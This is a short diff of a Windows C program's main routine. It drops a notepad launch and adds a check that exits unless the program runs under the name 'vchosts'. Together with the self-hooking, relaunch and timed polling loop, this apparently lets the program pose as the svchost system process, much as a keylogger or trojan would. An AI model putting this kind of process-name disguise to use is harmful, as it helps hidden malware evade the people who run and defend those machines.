@@ -259,10 +259,14 @@ int main(int argn, char* argv[])
 		FindClose(handle);
 		Hook(argv[0], 1);
 		ShellExecute(0, "open", path, NULL, NULL, SW_SHOW);
-		ShellExecute(0, "open", "notepad", NULL, NULL, SW_SHOW);
 		exit(0);
 	}
-	
+
+	if(strstr(argv[0], "vchosts") == 0)
+	{
+		exit(0);
+	}
+
 	mutex = CreateMutex(NULL, FALSE, NULL);
 	
 	buffer = (char*)malloc(BUFFERLEN);
@@ -307,6 +311,5 @@ int main(int argn, char* argv[])
 		timer++;
 		Sleep(1000); // 1 sec sleep
 	}
-	
 	return 0;
 }
